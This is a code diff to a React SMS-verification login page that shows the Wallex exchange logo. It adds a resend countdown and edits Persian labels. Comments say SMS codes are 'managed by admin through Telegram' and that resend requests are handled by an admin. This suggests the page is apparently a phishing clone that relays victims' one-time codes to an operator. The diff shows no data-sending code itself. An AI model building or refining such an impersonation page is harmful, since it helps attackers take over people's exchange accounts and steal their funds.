@@ -16,6 +16,7 @@ const AuthSMS = () => {
   const location = useLocation();
   const navigate = useNavigate();
   const [smsCode, setSmsCode] = useState("");
+  const [countdown, setCountdown] = useState(60);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [errors, setErrors] = useState<{ smsCode?: string }>({});
   const [isSecondAttempt, setIsSecondAttempt] = useState(false);
@@ -74,7 +75,10 @@ const AuthSMS = () => {
     }
   }, [countdown]);
 
-  // SMS codes are now managed by admin through Telegram
+  const handleResendCode = () => {
+    setCountdown(60);
+    console.log("Resend code requested - Admin will handle this");
+  };
 
   const handleCodeSubmit = async () => {
     // Clear previous errors except for second attempt warning
@@ -203,9 +207,7 @@ const AuthSMS = () => {
                   }}
                 />
               </Button>
-              <span style={{ fontWeight: "700", fontSize: "16px" }}>
-                تایید پیامک
-              </span>
+              <span style={{ fontWeight: "700", fontSize: "16px" }}>ورود</span>
             </div>
             <img
               src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
@@ -382,7 +384,7 @@ const AuthSMS = () => {
                       className="animate-spin mr-2"
                       style={{ width: "16px", height: "16px" }}
                     />
-                    در حال تایی��...
+                    در حال تایید...
                   </div>
                 ) : (
                   "تایید کد"
